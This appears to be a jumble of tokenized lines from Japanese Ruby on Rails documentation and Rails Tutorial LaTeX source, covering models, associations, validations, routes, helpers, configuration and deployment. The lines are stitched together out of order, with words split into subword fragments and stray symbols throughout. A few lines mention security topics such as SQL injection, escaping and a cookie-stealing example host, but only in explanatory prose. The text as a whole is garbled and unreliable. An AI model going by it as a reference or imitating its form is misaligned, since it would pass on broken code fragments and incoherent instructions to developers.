▁\ k ode { header } タグ の クラス と同様に 、 これらの クラス も Bootstrap において 特別な 意味 を 持 っています 。
▁orders ▖ destroy ( object , ▁ ▖▖▖)
▁ただし 、 配列 は 複 製 されました が 、 配列 の 要素 は そう ではありません 。
▁` end _ of _ minute ` メソッドは 、 その 分 の 最後の 時点 ▁( h h : m m : 59 ) ▁ の タイムスタンプ を返します 。
▁ ブロック フォーム に対して 制限 を指定することもできます 。
▁この 第 2 の モデル では 、 記事 への コメント を 扱 います 。
▁=> ▁" production "
▁WARNING : ▁この場合 オブジェクトは _ 無 条件 で _ データベースから 削除 されます ▟ このとき 、`: dependent ` オプション が どのように 設定 されて いて も 無視 して 削除 が 行われます 。
▁> > ▁Rails ▖ env ▖ test ?
▁ サンプルアプリケーションの \ k ode { Gemfile } ▁( 完成 )
▁Rails の 慣例 では 、 モデルの 主キー は ` id ` カラム に保存 されている ことを 前提と します 。
▁#### # ▁`: association _ foreign _ key `
▁File ▖ open ( file _ name ) ▁ { ▁| f | ▁ Marshal ▖ load ( f ) ▁ }
▁ ╼\ end { item ize }╼╼ ▁% ▁subsection ▁we a k ness es _ of _ the _ users _ resource ▁( end )╼╼ ▁% ▁section ▁users _ resource ▁( end )╼╼ ▁\ section { Microposts ▁ リソース } ▁% ▁( fold )╼ ▁\ label { sec : microposts _ resource }╼╼
▁resources ▁: comments , ▁only : ▁ [: index , ▁: new , ▁: create ]
▁図 \ ref { fig : edit _ page } の " Name " や " E mail " の 部分 を見ると 、 Rails によって 名前 や メールアドレス の フィールド に 値 が自動的に 入力 されている ことがわかります ▟ これらの 値は 、\ k ode {@ user } 変数 の 属性 情報 から 引 き 出 されています 。
▁Users コントローラの 生成 ▁(\ k ode { new } アクション を追加 )
▁TIP : ▁Rails は 外部キー の カラム を自動的に 作る ことはありません 。
▁最初の Micropost ▁ spec 。
▁\ k ode { full _ title } テスト ヘルパー を 単 純 に ▁\ k ode { include } で 置 換 する 。
▁ 他にも 、\ text tt { PATCH } と ▁\ text tt { DELETE } という 2 つの 操作 があり 、 それぞれ サーバー 上の 何か を \ emph { 更新 } したり \ emph { 削除 } したり するときに 使われ ます 。
▁order ▖ destroy
▁ バージョン管理 システム を 導 入 しておけば 、 プロジェクト のコード の 履 歴 を 追 った り 、 う っかり 削除 し てしまった ファイルを 復 旧 ▁( ロールバック ) ▁ したり という 作業 が 行える ようになります 。
▁ 本書 の例では 、 Bootstrap の 恩恵 を得る ために 、 私 達 は 最初から SCSS を使用しています 。
▁| ▁| ▁20 3 ▁| ▁: n on _ author it a tive _ information ▁|
▁d ▖ end _ of _ week ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁<%= ▁@ user ▖ name ▁%> 様 、 example ▖ com へ よう こ そ 。
▁ これまで の Rails では 、 JSON ▁gem と の 互換性 に 何らかの 問題が生じ ていました 。
▁X - Sendfile ヘッダー は Web サーバー に対する ディレクティブ であり 、 アプリケーション からの レスポンス を ブラウザに送信 せずに 破 棄 し 、 代りに 別の ファイルを デ ィ ス ク から 読み だ して ブラウザに送信 します 。
▁{0} 図 11 ▖9{/0} {1} Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル ▟ {/1}
▁def ▁receive ( email )
▁( 送信 ボタン が クリック された り 、 JavaScript で form ▖ submit を呼び出す など して ) ▁ フォーム が 送信される と 、 フォームの 入力 内容 は params オブジェクト に まとめて 保存 され 、 コントローラ に渡され ます 。
▁ 2006 年 に 筆者 が 受 講 した Rails の コース では 、 M i k e の他に \ emph { Programming ▁Ruby } の 著者 Dave ▁ Thomas も 講 師 を 務 め ていました
▁ l s : ▁app / controllers / : ▁No ▁such ▁file ▁or ▁directory
▁ここで 行いたい 選択 は 、 上 よりも もう少し 複 雑 で 、 たとえば 以下のような 感じ になります 。
▁te } ╼╼% ▁subsection ▁a _ validity _ test ▁( end )╼╼ ▁\ subsection { 存在性 を検証する } ▁% ▁( fold )╼ ▁\ label { sec : presence _ validation }╼╼
▁このオプション は 、 関連付け 名 から 関連付け 元の 名前 が自動的に 推 論 できない 場合 以外に は 使用 する必要はありません 。
▁* ▁` config ▖ assets ▖ compile ` は 、 production 環境で の 動的な Sprockets コンパイル をオンに する かどうかを true / false で 指定します 。
▁置き換えた結果を リスト \ ref { code : demo _ microposts _ resource } に示します 。
▁ strip _ links (" email s ▁to ▁< a ▁ href =" mail to : me @ email ▖ com "> me @ email ▖ com </ a > ▖ ")
▁ env ▖ cache ▁= ▁ ActiveSupport :: Cache ▖ lo o k up _ store (: null _ store )
▁TIP : ▁以下の例 では 、 Unix 系 OS の プロンプト として ` $ ` 記 号 を使用しています が 、 これは カスタマイズ 可能 であり 、 自分の 環境では 異なる 記 号 になっている こともあります 。
▁Rails の あらゆる オブジェクトは ` to _ param ` メソッドに 応答 します ▟ これは 、 オブジェクトを 値 として 表現 する もの を返す ということです ▟ 返 された 値は クエリ 文字列 や URL の一部 で 使用できます 。
▁(\ ref { sec : deploying } のとき と同じように 警 告 メッセージ が表示される ことがあります が 、 無視 して 構 いません 。
▁build _ customer
▁### ▁`: allow _ blank `
▁\ text tt { cucumber - rails } ▁gem を \ k ode { Gemfile } に追加する 。
▁\ k ode { name } や \ k ode { email } といった カラム名 を 今のうちに 考え ておく ことで 、 後 ほど User オブジェクト の各 属性を ActiveRecord に 伝える ときに 楽 になります 。
▁self を省略した 結果を リスト \ ref { code : followers _ test } に示します 。
▁#### ▁` has _ and _ belongs _ to _ many ` で 追加される メソッド
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけて 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システムを 順に 作成し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁by ▁[ Michael ▁Hartl ]( http :// michael hartl ▖ com / )▖
▁< label ▁for =" file "> File ▁to ▁ Upload </ label > ▁<%= ▁file _ field _ tag ▁" file " ▁%>
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example ▖ com "}
▁ MySpace の Sam y ワーム については 次の CSS インジェクション の 節 で説明します 。
▁ このように 書くこと で 、 条件 で 多数の 変数 が 使用されている 場合に コードが 読みやすく なります 。
▁` re order ` メソッドは 、 デフォルトの スコープ の 並び順 を上書き します 。
▁Rails は 、 デフォルトで すべての ビューテンプレート を コンパイル して メソッド 化 し 、 出力 に 備 えます 。
▁以下の Active ▁Record の例では 、 この メソッドを使用して counter _ cache カラム の名前 を 求 め ています 。
▁\ k ode { do } キーワード は 、 ▁\ k ode { form _ for } が 1 つの 変数 を持つ ブロック を 取ること を表し ます ▟ この 変数 \ k ode { f } は ▁“ form ” ▁ の f です 。
▁従って 、 Rails 開発 において 別の 言語 環境で の 従来 の開発 手法 に 固 執 し 、 他 所 で学んだ パターン を 強 引 に 適用 しようとすると 、 せっかく の開発 が 楽 しく なく な っ てしまう でしょう 。
▁ サンプル データ に following / follower の関係 性 を追加する
▁たとえば 、` Book sController ` という コントローラに 以下のコード が あるとします 。
▁### ▁O / R マッピング
▁` config ▖ generator s ` メソッドを使用して 、 Rails で使用される ジェネレータ を変更 できます 。
▁また 、 ス ク リ ー ン シ ョ ッ ト では Bootstrap ▁2▖0 を使用しています が 、 この チュートリアル では Bootstrap ▁2▖ 3 を使用している ので 、 外 観 に 多少 の違い が 生じる 可能性 がある ことを ご 了 承 ください 。
▁< p > This ▁is ▁a ▁special ▁page ▖ </ p >
▁* ▁`: join _ table `
▁format ▖ html ▁ { ▁render ▁action : ▁' new ' ▁ }
▁te }╼╼ ▁% ▁subsection ▁inheritance _ hierarchies ▁( end )╼╼ ▁\ subsection { アプリケーションを デプロイ する } ▁% ▁( fold )╼ ▁\ label { sec : deploying _ the _ toy _ app }╼╼
▁詳細については [ Programming ▁Ruby ]( http :// www ▖ ruby - doc ▖ org / docs / Programming Ruby / ) を参照してください 。
▁module ▁M
▁* ▁` config ▖ i 18 n ▖ available _ locales ` は 、 アプリケーションで 利用できる ロケール を ホワイトリスト 化 します 。
▁# ▁=> ▁< input ▁id =" attachment " ▁name =" attachment " ▁type =" file " ▁/>
▁ここでは 、\ href { http :// github ▖ com / thoughtbot / factory _ g ir l } { Factory ▁Girl } を使用して 生成 した ファクトリー を使用します ▟ Factory ▁Girl は 、\ href { http :// thoughtbot ▖ com /}{ thoughtbot } の メンバー が 作成した Ruby ▁gem です 。
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 , ▁ separator : ▁ / \ s / )
▁ただし 、 Git では 既存の コミット を さ か の ぼ って 変更 したものを プッシュ することは 許 されていません ▟ 既に プッシュ された ブランチ と ローカル の ブランチ が 一致し ない からです 。
▁なお 、 今後 必要 になるので 、 リスト \ ref { code : users _ fixtures _ extra _ users } では 2 人 の 名前付き ユーザー も一緒に 追加 しています 。
▁しかし 、 Rails では 一般的な バリデーション メソッドが 多数 提供され ているので 、 カスタム の メソッド を作成する のは 比 較 的 簡単です 。
▁ 初期化 イベント
▁しかし このままでは ID が 生の テキスト として cookies に保存 されてしまう ので 、 アプリケーションの cookies の 形式 が 見え 見え に なってしまい 、 攻撃者が ユーザー アカウント を 奪 い 取ること を 助 け てしまう 可能性があります 。
▁=> ▁" 4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁ 14 , ▁ 15 , ▁ 16 , ▁17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁### ▁ 名前付き リソース で `: as ` を使用する
▁X - Time r : ▁S 140 89 12 12 5 ▖ 2 1 16 38 2 12 , V S 0, V E 0
▁def ▁active _ customer
▁" b ackoffice / session "▖ camelize ▁# ▁=> ▁" B ackoffice :: Session "
▁Action ▁Controller の 機能 の 多く は ミドルウェア として 実装 されています 。
▁class _ name : ▁" Order "
▁$ ▁rails ▁destroy ▁model ▁User
▁上の 疑問符 がある ことで 、 SQL クエリ に インクルード される 前に \ k ode { id } が 適切に \ emph { エスケープ } される ことを 保 証 してくれる ため 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL _ inject ion }{\ emph { SQL インジェクション } } と呼ばれる 深 刻 な セキュリティホール を 避ける ことができます 。
▁リスト \ ref { code : password _ reset _ preview } のコード で 、 HTML メール と テキスト メール をそれぞれ プレビュー できるようになります ▁( 図 \ ref { fig : password _ reset _ html _ preview } と 図 \ ref { fig : password _ reset _ text _ preview }) 。
▁{0} 図 3 ▖2{/0} ▁{1} \ href { http ://0▖0▖0▖0:3000/ static _ pages / home }{/ static _ pages / home } にアクセス した結果 {/1}
▁Do c to r al ▁di s s er t ation , ▁Un ivers ity ▁of ▁C a li for n ia , ▁I r v in e , ▁2000 ▖
▁### ▁ 検証 ▁( バリデーション ) ▁ の 追加
▁ クラウド IDE を お 使い の場合は 、 Heroku の バージョン番号 と とも に \ k ode { heroku } ▁C L I が 利用 可能 である という メッセージ が表示されます ▟ クラウド IDE を使用して い ない場合は 、\ href { https :// t oolbelt ▖ heroku ▖ com /}{ Heroku ▁T oolbelt } をインストール する必要があります
▁ 送信 したい パッチ の詳細 を 記 入 し 、 わかりやす い タイトル を付け ます 。
▁( JavaScript ランタイム が インストール されていない という エラーが表示され た場合 は 、\ href { https :// github ▖ com / s s te phens on / execjs } { GitHub の execjs ページ } にある インストール 可能な ランタイム を 確認してください 。
▁ ▖ class ▁ { ▁background - image : ▁url ( <%= ▁asset _ path ▁' image ▖ png ' ▁%> ) ▁ }
▁ UT F -8 でない データ の 主な 原 因 は 以下の 2 つ です 。
▁scaffold の コードを 理解 できる ぐらい なら 、 そ も そ も 本書 を 読む 必要はない でしょう 。
▁# ▁created _ at ▁: datetime
▁* ▁` config ▖ action _ mailer ▖ delivery _ method ` は 、 配信 方法 を指定します ▟ デフォルト は `: smtp ` です 。
▁* ▁`: auto save `
▁ この時点で テストが 失敗する ことを確認してください 。
▁d ▖ sunday ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁ { a } ▁through ▁\ k ode { z } ? ▁What ▁about ▁the ▁same ▁ range ▁ reverse d ? ▁\ emph { Hint } : ▁In ▁both ▁cases ▁you ▁will ▁have ▁to ▁convert ▁the ▁ range ▁to ▁an ▁array ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 e 1 3 ce ' ></ span >╼ \ end { enumerate }╼╼ ▁\ subsection { ブロック } ▁% ▁( fold )╼ ▁\ label { sec : block s }╼╼
▁B ▖ x ▁# ▁=> ▁: a
▁### ▁ 個 数を 数 え る
▁` video _ tag ` に ビデオ ファイル の配列 を 渡す ことで 、 複数の ビデオ を再 生 することもできます 。
▁Users 用の 最初の \ k ode { new } アクション
▁create ▁app / helpers / blorgh / articles _ helper ▖ rb
▁def ▁ foo
▁</ html >
▁Active ▁Record コールバック を使用することで 、 モデル のライフサイクル における 特定の イベント 実行時に コードを ア タ ッ チ して 実行 することができます 。
▁次に 、\ k ode { data - turbolinks - track } における キー と 値 の ペ ア の 表 記 が 、 旧 式 の ハッシュ ロ ケ ッ ト ▁( => ) ▁ スタイル になっている 点が 不思議 です 。
▁ inflect ▖ acronym ▁' SSL '
▁"#{ title } ▁- ▁# { truncate ( text )} "
▁Client ▖ minimum (" age ")
▁ この節 と 次の 節 では 、 セッション 機能 を作成する 準備 として 、 Session コントローラ 、 サインイン 用の フォーム 、 そして これら に関連する コントローラのアクション を作成します 。
▁`: message ` オプション が使用され ていない 場合は デフォルトの メッセージ が使用されます 。
▁( 以下の リスト を入力する 前に 、 古 い \ k ode { Word } クラスの 定義 を 消 去 するために 、 Rails コンソール を い った ん 終 了 してください ) 。
▁以下の 4 つの 関連付け コールバック を使用できます 。
▁new フォーム と edit フォームの フィールド に使用する パーシャル 。
▁### ▁` id s `
▁ テスト されていない ブランチ で 例外を発生 する
▁* ▁ ドキュメント 作成 用の スタイル ガイド ▁( Ruby コード 開発 用の スタイル ガイド とは 別 )
▁has _ many ▁: recent _ orders ,
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / : id / edit ▁| ▁ ads # edit ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 1 つ を編集する HTML フォーム を返す ▁|
▁`-- full ` オプションは 、 以下 を 提供する ス ケ ル ト ン 構造 を含む エンジン を作成します 。
▁ Initial ▁commit
▁もちろん 、 Rails では 他の 認 証 方法 を使用することもできます 。
▁ 特に 、\ ref { sec : the _ asset _ pipeline } 以降 では Rails ▁3▖1 の 新 機能 である \ k ode { アセットパイプライン } の一部 となる \ emph { app / assets } ディレクトリ について 詳 しく 説明します ▟ アセットパイプライン によって 、 CSS ▁( C ascad ing ▁Style ▁Sheet ) ▁ や JavaScript ファイル などの アセット ▁( 資 産 ) ▁ を簡単に 編 成 したり デプロイ することができます 。
▁def ▁find _ recent
▁( 確 認 のために 2 時間 も 待 って い ら れ ないので 、 テスト には もうひとつ 分 岐 を追加します が 、 これは \ ref { sec : exercises _ updating _ the _ reset } の演習 に 回 す ことにします ) 。
▁Rails ▁4▖0 では Active ▁Resource が gem 化 されました 。
▁ _ ` escape HTML () ` ▁( または 別 名 の ` h () ` ) ▁ メソッド _ ▁ を使用して 、 HTML 入力 文字 「 & amp ; 」「 & quot ; 」「 & lt ; 」「 & gt ; 」 を 、 無 害 な HTML 表現 形式 ( ` & amp ; `、` & quot ; `、` & lt ; `、` & gt ; ` ) ▁ に置き換え ます 。
▁c attr _ accessor ▁: field _ error _ proc
▁self を省略した 結果を リスト \ ref { code : debugger } に示します 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁ greater ▁than ▁% { count } " _ ▁ です 。
▁class _ attribute ▁: x , ▁instance _ reader : ▁false
▁ 次 の例では 、 http :// www ▖ attacker ▖ com / ▁という URL から 画像 と cookie を 読み込み ます 。
▁ フ ォ ー ク の ク ロー ン を 保存 した ディレクトリ で 以下を実行し ます 。
▁@ books ▁= ▁ Book ▖ all
▁ 複数の 条件 を 指定 したい場合は 次のように します 。
▁create ▁app / models / blorgh / comment ▖ rb
▁ユーザー登録 情報 の 送信 の場合 、\ k ode { params } には 複数の ハッシュ に対する ハッシュ ▁( hash - of - hashes : ▁ 入 れ 子 になった ハッシュ ) ▁ が含まれます ▁( なお 、\ ref { sec : hashes _ and _ symbols } では hash - of - hashes の 説明 と とも に 、 コンソール セッション で使用する ために あえて \ k ode { params } という名前の 変数 を導入し ました ) 。
▁これは 、 Web サイト で ユーザー登録 を 行えるように するための 最初の 重要な 一 歩 となります ▟ 次の 一 歩 である ユーザーの モデリング は {0}{1} 第 6 章 {/1}{/0} で 行い 、 {2}{1} 第 7 章 {/1}{/2} で ユーザー登録 が 完成 します 。
▁-- ▁create _ table (: microposts )
▁ リファクタリング や ドキュメント 変更 の場合は C HA N G E LO G を変更 しないでください 。
▁ 外部 参 照 キー 参 照 は 、 データベース レベルで の 制 約 です ▟ これによって 、 Microposts テーブルの user _ id は 、 Users テーブルの id カラム を参照 するようになります 。
▁hidden _ field _ tag ▁' token ', ▁' V U B J K B 23 U I V I 1 U U 1 V O B V I @ '
▁ 著者 の場合 、 原 則 として \ k ode { bundle ▁exec } は 追加 せずに 実行 し 、 うまく い か ない とき だけ \ k ode { bundle ▁exec } を追加して 様 子 を見 る 、 という ことを よく 行 っています 。
▁Client ▖ created _ before ( Time ▖ zone ▖ now )
▁A nother ▁routing ▁error , ▁un initialize d ▁constant ▁Article sController ]( images / getting _ started / routing _ error _ no _ controller ▖ png )
▁ 永続的セッション の \ k ode { current \_ user } を更新する
▁$ ▁ heroku ▁ maintenance : on ╼ $ ▁git ▁push ▁ heroku ╼ $ ▁ heroku ▁run ▁rake ▁db : migrate ╼ $ ▁ heroku ▁ maintenance : of f
▁` destroy ` アクション では 、 まず どの 記事 が 対象 である か を検索し て @ article に保存 し 、 続いて `@ article ▖ comments ` コレクション の 中の どの コメント が 対象 である か を 特定 して @ comment に保存 します ▟ そして その コメント を データベースから 削除 し 、 終わったら 記事 の ` show ` アクションに 戻 ります 。
▁ただし 、 有効化トークン の場合 と異なり 、 パスワード 再設定 用 トークン は ビュー の中で 使用される 点にご注意ください ▟ 有効化トークン は \ k ode { before _ create } コールバック で ユーザー ひ と り ひ と り に対して 作成されます ▁( リスト \ ref { code : user _ model _ activation _ code }) ▁ が 、 パスワード 再設定 用 用 トークン の 方は ユーザーが 「 forgot ▁password 」 フォーム を 送信 できた 場合に だけ 作成されます 。
▁` render ` で `: body ` オプション を指定する ことで 、 content ▁type を 一 切 指定 しない 生の コンテンツ を ブラウザに送信 することができます 。
▁最初の 行 は 、 送信された メールアドレス を使用して 、 データベースから ユーザー を取り出し ています 。
▁Ruby の 組み込み クラス には 配列 、 範囲 、 ハッシュ など がある
▁Rails は 、 何か を な す うえで 最 善 の 方法 という もの が 1 つだけ ある と 仮 定 し 、 それ に 沿 った 開発 を 全 面 的に 支 援 します ▟ 言い 換 え れば 、 ここで 仮 定 されている 理想 の開発 手法 に 沿 わ ない 別の 開発 手法 は 行い に く くなる ようにしています 。
▁{0} 図 5 ▖2{/0} カスタム CSS を使用して いない {1} Home ページ ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home })▟ \ href { http :// railstutorial ▖ org / images / figures / layout _ no _ logo _ or _ custom _ css _ bootstrap _ rails _ 4 - full ▖ png }{( 拡大 ) }{/1}
▁WARNING : ▁このメソッド を呼び出し ても 、 結合 レコード で コールバック は トリガ されません 。
▁上の 正規表現 を使用して 属性の値 に対する バリデーション が 行われます 。
▁ 初 歩 的な 貢献 として 、 バグ レポート を確認する 作業 も 大 変 役に立ちます 。
▁ コメント を削除する
▁< form ▁action ="/ articles /1 " ▁class =" button _ to " ▁data - remote =" true " ▁method =" post ">
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure ▖
▁たとえば 、1 つの ドキュメント に 多くの 節 ( section ) があり 、1 つの 節 の下に 多くの 段 落 ( p ar a gr a ph ) がある 状態 で 、 節 を スキップ して ドキュメント の 下 の すべての 段 落 の 単純な コレクション が 欲 しい とします 。
▁### ▁ フ ォ ー マ ッ テ ィ ング
▁ 基本的な 更新 の 方法は 2 つ です 。
▁<%= ▁comment ▖ comment er ▁%>
▁ 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new })
▁この章では 、 まったく 最初から User モデル を作成し 、 それ に \ k ode { name } 属性 と \ k ode { email } 属性 を与え 、 さまざまな パスワード 属性 も 与 え 、 値を 制限 する 多くの 重要な 検証 も 追加 しました 。
▁has _ and _ belongs _ to _ many ▁: assemblies
▁ //= ▁require ▁ jquery _ ujs
▁Date : ▁Thu ▁Oct ▁ 15 ▁ 11 : 36 : 2 1 ▁200 9 ▁- 07 00
▁self を省略した 結果を リスト \ ref { code : password _ reset _ edit _ action } に示します 。
▁ カスタマイズ したい クラスは 、 前述の ` User ` のような クラス ばかり とは限りません 。
▁h w p c b m z e ▖ heroku app ▖ com ╼ se y j h f lo ▖ heroku app ▖ com ╼ j h y ice v g ▖ heroku app ▖ com
▁最初に RailsCast 「\ href { http :// r ailscasts ▖ com / episodes / 2 06 - action - mailer - in - rails - 3 } { Rails ▁3 の Action ▁Mailer }」 を参照してください 。
▁Rails プロジェクト で使用する \ k ode { workspace } ディレクトリ を作成する ( クラウド の場合は 不要 ) 。
▁### ▁ 関連付けられたオブジェクト も 削除 する
▁ symbolize _ keys メソッド のおかげで 、2 行目 で `: params ` キー に 安全 にアクセス でき ています ▟ メソッドの 利用 者 は 、`: params ` のような シンボル と " params " のような 文字列 のどちら で も使用できます 。
▁Rails の 複数形 化 メ カ ニ ズ ム は非常に 強 力 で 、 不 規 則 な 語 であっても 複数形 に したり 単数形 に したり できます ( person ▁< - > ▁people など ) 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ 123 4 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁T housand "
▁### ▁Rails 全 般 の設定
▁| ▁| ▁40 1 ▁| ▁: un authorize d ▁|
▁さらに 前 述 した ように 、\ k ode { match ▁ ’ / about ’} という コード は自動的に コントローラと ビュー で使用する \ emph { 名前付きルート } を生成します 。
▁リスト \ ref { code : length _ validation _ test } では 、 51 文字 の 文字列 を簡単に 作る ために ▁“ 文字列 の かけ 算 ” ▁ を使い ました 。
▁\ ref { sec : sample _ users } の サンプル データ 生成 タスク に マイクロポスト も 追加 して 、 この 情 け ない 状 況 を 修正 しましょう 。
▁ ステータスフィード の 基本的な アイディア は シ ン プ ル です 。
▁` has _ many ` 関連付け では 以下の オプション が サポート されます 。
▁` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション にした ` radio _ button ` タグを返します 。
▁` app / views / blorgh / articles / index ▖ html ▖ erb ` という ファイル を作成して 以下のコード を追加する とします 。
▁ ハッシュ も ` to _ query ` に 応答 します が 、 異なる シ グ ネ チ ャ を使用します 。
▁以下の例 文 では you が 3 度 も 使用されている 。
▁ 実際 、 テキストエディタ や IDE を使い こ な せる ように なる まで には 相 当 な 時間 が必要 になります ▟ たとえば S ublime ▁Text や V im にも 専 用の チュートリアル があり 、 このような チュートリアル を 読み 終 え る だけで も 数 週 間 か か ります 。
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が完成しました ( {0}{1} 第 8 章 {/1}{/0} ) 。
▁JavaScript コードは Rails の あらゆる Web ページ で まるごと バ ンド ル されます ▟ つまり 、 ページ が 最初に ブラウザに 読み込まれる ときに ダウンロード され 、 以後 は ブラウザで キャッシュ されます 。
▁{0} 図 ▁ 2▖2 ▁{/0}{1} ユーザーの データモデル {/1}
▁2 ) ▁ できる だけ 念 入 り に Google で 検索 し 、 自分 が 調 べ よう と している トピック に 言 及 している ブログ や チュートリアル がない かどうか 、 よく 探 す ことです 。
▁### ▁ 抽 出
▁< title > <%= ▁@ page _ title ▁or ▁" P age ▁ Title " ▁%></ title >
▁ 外部 アプリケーション や JavaScript から Rails アプリケーションの 署 名 付き セッション cookies ▁( または 一 般 の 署 名 付き cookies ) ▁ を 読み 出 せる 必要がある 場合は 、 これらの 問題 を 切り 離 す まで は ` secret _ key _ base ` を設定し ないでください 。
▁ 実際の インデックス ページ を作成する には 、 ユーザー を列挙し て ユーザー ごとに \ k ode { li } タグ で 囲 む ビュー を作成する必要があります 。
▁これで 、 ユーザー / マイクロポスト 関連付けの 最 終 形 が完成しました ▟ すべての テストが パスするはずです 。
▁作成した コードをリスト \ ref { code : micropost _ partial _ with _ delete } に示します
▁上の 例 の場合 、` x ?` となります 。
▁という ことで 再び これまで と同じ ジェネレータ を使用して みましょう 。
▁### ▁S an it ize Helper
▁ 実際に 得 られる 文字列 は 、` ActiveSupport :: M ul t i by te :: C ha rs ` のインスタンス で ラ ッ プ されています 。
▁<% ▁@ greeting ▁= ▁capture ▁do ▁%>
▁ 以後 本ガイド では 「 完全な プラグイン ▁( full ▁plugin )」 を 単 に 「 エンジン 」 と呼びます 。
▁ 実は 、 Rails は 確 か に Ruby で \ emph { 書かれ て } います が 、 既に Ruby とは 別 物 なのです 。
▁' X - XSS - Pro t ec tion ' ▁=> ▁' 1 ; ▁mode = block ',
▁create
▁# ▁ 論理値 テスト
▁しかし \ ref { sec : find ing _ user _ objects } で 既に 経験 済み のとおり 、 ユーザー ID が 存在しない 状態 で \ k ode { find } を使用すると 例外 が発生し てしまいます 。
▁このメソッドは 、 レシーバの 行 に インデント を与え ます 。
▁ 最も シンプルな JavaScript を例にとって 考えてみましょう 。
▁` app / assets / javascripts / application ▖ js ` という マニフェスト の内容 が 以下のように な っている とします 。
▁` # image _ tag ` はデフォルトで は 常に ` / images / icon ▖ png ` を返します が 、 アセットパイプライン など を含む Rails の フル スタック で 見 ると 、 上のような 結果 が 返される ところ もあります 。
▁ どんな Rails アプリケーション も 最初の 作成 手順 は 基本的に 同じです ▟\ k ode { rails ▁new } コマンドを実行 して 作成します 。
▁Rails ▖ application ▖ routes ▖ d raw ▁do
▁この 動的 フ ァ イン ダ メソッドの 末尾に ` Client ▖ find _ by _ name !( " Ryan ") ` のように 感 嘆 符 ▁( ` !` ) ▁ を追加する と 、 該当する レコード がない場合 に ` ActiveRecord :: RecordNotFound ` エラーが発生し ます 。
▁ 評価 の 結果は 、\ k ode {" foo "} ▁ と ▁\ k ode {" bar "} ▁ を 足 した \ k ode {" foobar "} になりました
▁has _ many ▁: manifest s
▁この ヘルパー を使用して 、` has _ one ` または ` has _ many ` リレーションシップ を経由して 関連付けられたオブジェクト が存在する こと を検証する と 、` blank ?` でも なく ` marked _ for _ destruction ?` ( 削除 するために マーク されている ) でも ない かどうか が チェック されます 。
▁issue を 自分の コンピュータ で 再 現 できる かどうかを 試 してみましょう 。
▁ 残 念 ですが 、 この場合は ページ 分割 された フィード を返し ても うまく 動きません 。
▁ 今回の StaticPages コントローラ にある メソッドは 、 以下のように どちらも 最初は 空 になっています 。
▁` Array ▖ deep _ dup ` メソッドは 、 自分自身 を 複 製 すると 同時に 、 その 中の すべての オブジェクトを Active ▁Support の ` Object # deep _ dup ` メソッド によって 再帰的 に 複 製 します 。
▁Git ユーザーは これまで 同様 新しい トピックブランチを作成 してください 。
▁この場合 、` - % >` で タグ を 閉 じ る ことはできません のでご注意ください 。
▁ メールを送信 する
▁ 現時点では 、 上のコード のうち 、 以下のコード だけ が 動作 していません 。
▁最後に 、 システムによっては 変更を 反 映 するために ターミナル で \ text tt { Ctrl - C } を 押 して Web サーバーを再起動 する必要が 生じる こともあります
▁Thu s , ▁we ’ ll ▁ begin ▁with ▁a ▁model ▁for ▁\ emph { users } ▁of ▁the ▁app ▁( Section ▁\ ref { sec : modeling _ demo _ users }), ▁and ▁then ▁we ’ ll ▁add ▁a ▁model ▁for ▁\ emph { microposts } ▁( Section ▁\ ref { sec : modeling _ demo _ microposts }) ▖
▁ ユーザーのマイクロポスト に \ k ode { dup } メソッド を適用する と 、 次のような コード になります 。
▁ カスタム の 例外 を `: strict ` オプション に追加する こともできます 。
▁=> ▁[1, ▁4 , ▁ 9 , ▁ 16 , ▁ 25 ]
▁ タイトル で 埋め込み Ruby を使用した About ページのビュー
▁\ emph { ヒント } : ▁リスト \ ref { code : user _ profile _ test } のテスト に追加し てください 。
▁ メールアドレス の長さ に対する バリデーション も 、 次のように 長い 文字列 を作成して 検証 します 。
▁* ▁: foreign _ key
▁ユーザー登録 で まず 初 め に や ること は 、 それらの 情報を 保存 するための データ構造 を作成する ことです 。
▁ ミックスイン 機能 を使用することで 、 CSS ルール の グループ を パッケージ 化 して 複数の 要素 に 適用 することができます ▟ たとえば 以下のような 変換 を行います 。
▁\ k ode { gravatar _ for } ヘルパー に キーワード 引数 を追加する
▁これらの ファイルは 頻繁に 更新 される ため 、 バージョン管理 に含め る のは 何か と 不 便 です 。
▁self を省略した 結果を リスト \ ref { code : log _ in _ with _ remember } に示します 。
▁### ▁config / initializers / wrap _ parameters ▖ rb
▁ 技術 的に は 、 メールアドレス のうち ドメイン 名 部分 だけ が ▁( 本 当 は ) ▁ 大文字 小文字 を 区別 しません ▟ foo @ bar ▖ com は 、 本 来 は d Foo @ bar ▖ com とは 別の アドレス です 。
▁デフォルトのエラーメッセージは ▁_" is ▁not ▁a ▁number " _ ▁ です 。
▁ そのような 変更 が 行われ 、 かつ 更新 が 無視 された 場合 、` ActiveRecord :: StaleObjectError ` 例外が発生します 。
▁` association ▖ nil ?` メソッドを使用して 、 関連付けられたオブジェクト が存在する かどうかを確認 できます 。
▁collection ▁do
